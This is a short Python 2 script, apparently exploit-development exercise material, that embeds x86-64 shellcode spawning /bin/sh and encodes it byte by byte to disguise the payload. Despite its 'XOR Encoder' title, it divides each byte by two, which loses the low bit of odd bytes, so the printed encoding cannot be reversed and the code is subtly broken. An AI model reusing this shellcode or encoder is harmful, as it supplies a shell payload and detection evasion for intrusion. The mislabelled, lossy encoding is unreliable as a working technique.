#!/usr/bin/python

# Python XOR Encoder 

shellcode = ("\x48\x31\xf6\x48\xf7\xe6\x66\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\x6a\x3b\x58\x0f\x05")

encoded = ""
encoded2 = ""

for x in bytearray(shellcode) :
        # Division encoding
        y = x/0x2
        encoded += '\\x'
        encoded += '%02x' % y

        encoded2 += '0x'
        encoded2 += '%02x,' %y	



print str(encoded)

print encoded2

print 'Len: %d' % len(bytearray(shellcode))


